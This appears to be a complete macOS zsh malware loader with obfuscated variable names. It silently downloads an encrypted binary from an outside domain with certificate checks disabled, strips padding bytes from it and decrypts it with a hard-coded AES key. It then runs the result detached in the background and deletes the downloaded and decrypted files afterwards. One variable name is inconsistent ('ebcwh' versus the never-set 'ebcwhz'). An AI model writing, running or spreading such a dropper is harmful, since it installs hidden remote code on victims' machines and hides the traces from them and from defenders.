#!/bin/zsh
ebcwh=$(mktemp /tmp/c7jbdf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m328cec6c628e41a1.bin" -o "$ebcwhz" || exit 1
mkdv7v=$(stat -f %z "$ebcwhz"); tqss2m8=$(( mkdv7v - 1732 - 2957 ))
tail -c +$(( 1732 + 1 )) "$ebcwhz" | head -c $tqss2m8 | openssl enc -d -aes-256-cbc -k 63e5704926a4f86a0560b1bb -out "$ebcwh" 2>/dev/null
[ -s "$ebcwh" ] && chmod 700 "$ebcwh" && ( "$ebcwh" & ) && disown
( sleep 3; rm -f "$ebcwh" "$ebcwhz" ) &>/dev/null &
